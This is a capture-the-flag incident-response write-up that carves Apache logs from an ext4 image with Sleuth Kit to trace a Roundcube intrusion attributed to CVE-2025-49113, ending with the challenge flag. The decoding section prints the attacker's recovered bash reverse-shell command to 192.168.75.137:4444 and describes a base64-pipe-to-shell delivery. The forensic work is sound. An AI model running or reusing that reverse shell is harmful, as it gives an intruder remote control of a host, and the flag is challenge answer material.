# Disk Analysis 500 - Corrected IR Writeup

## Scope
Objective was to identify:
1. Foothold mechanism
2. Exploited vulnerability (CVE)
3. Related attacker endpoint (IP:PORT)

Expected flag format:
PEPxCyber{CVE-XXXX-XXXX_IP:PORT}

## Evidence Collected
Primary artifact:
- diskimage.7z

Extracted filesystem image:
- foothold.001 (ext4)

Relevant files carved from image:
- access.log (from inode 1183869)
- error.log (from inode 1183868)

## Methodology

### 1) Unpack and identify artifact
Commands:
```bash
7z l diskimage.7z
7z x -y diskimage.7z
file foothold.001
```

Finding:
- `foothold.001` is a Linux ext4 filesystem image.

### 2) Enumerate filesystem without mounting
Read-only mount was not available in the environment, so Sleuth Kit was used.

Commands:
```bash
fls foothold.001
fls foothold.001 1179650
fls foothold.001 1183717
```

<img width="476" height="553" alt="image" src="https://github.com/user-attachments/assets/a3f22e37-7f11-4159-bc71-9d53a9b4e02c" />
<img width="445" height="368" alt="image" src="https://github.com/user-attachments/assets/83a4b6e7-6d04-4554-bc27-7d75b031a7bf" />
<img width="476" height="134" alt="image" src="https://github.com/user-attachments/assets/b4fb5028-c1d6-4df0-9303-ff13321ee054" />


Findings:
- Web root contains Roundcube under `/var/www/html/roundcube`
- Apache logs present under `/var/log/apache2`

### 3) Extract and inspect web logs
Commands:
```bash
icat foothold.001 1183869 > access.log
icat foothold.001 1183868 > error.log
nl -ba access.log | sed -n '52,58p'
```

<img width="369" height="87" alt="image" src="https://github.com/user-attachments/assets/d591b53a-e4e6-4d55-9aed-3a3f101a3e33" />
<img width="456" height="146" alt="image" src="https://github.com/user-attachments/assets/afdd6eca-a754-4e9e-a378-e05266f069b7" />


Critical log evidence:
- `access.log` line 57 contains a malicious `POST` to Roundcube settings upload action with a heavily obfuscated `_from` parameter.
- Source shown in that request is `192.168.75.137`.

## Intrusion Reconstruction

### Timeline (from access.log)
1. `03/Nov/2025:13:23:05` - `GET /roundcube/` from `192.168.75.137`
2. `03/Nov/2025:13:23:07` - `POST /roundcube/?_task=login` from `192.168.75.137`
3. `03/Nov/2025:13:23:09` - malicious `POST` with serialized payload in `_from`

### Payload decoding summary
The `_from` field contained a character-delimited serialized payload. Decoding process:
1. URL-decode `_from`
2. Remove delimiter byte `0xC7`
3. Extract embedded base64 string after `echo+...+\7c+base64+-d+\7c+sh`
4. Base64-decode to recover executed shell command
<img width="1919" height="709" alt="image" src="https://github.com/user-attachments/assets/20dc82db-2c0f-4bad-863a-774602ec6b33" />

<img width="1539" height="904" alt="image" src="https://github.com/user-attachments/assets/c275e961-aa74-484e-bff5-ca7a5247346e" />


Recovered command:
```bash
bash -c 'exec bash -i &>/dev/tcp/192.168.75.137/4444 <&1'
```

Interpretation:
- Foothold method is a reverse shell callback.
- Callback destination is `192.168.75.137:4444`.

## CVE Determination
The request structure and payload behavior match the known Roundcube deserialization/RCE exploitation pattern attributed to:

`CVE-2025-49113`

<img width="1369" height="800" alt="image" src="https://github.com/user-attachments/assets/94d393d4-0f50-40cf-9633-55bc437a17d5" />


Important IR note:
- The CVE string is not explicitly written in logs.
- CVE attribution is based on exploit pattern matching against known Roundcube vulnerability behavior.

## Final Answer
`PEPxCyber{CVE-2025-49113_192.168.75.137:4444}`

## Reproduction Commands (Concise)
```bash
7z l diskimage.7z
7z x -y diskimage.7z
file foothold.001
fls foothold.001 1179650
fls foothold.001 1183717
icat foothold.001 1183869 > access.log
nl -ba access.log | tail -n 8
```
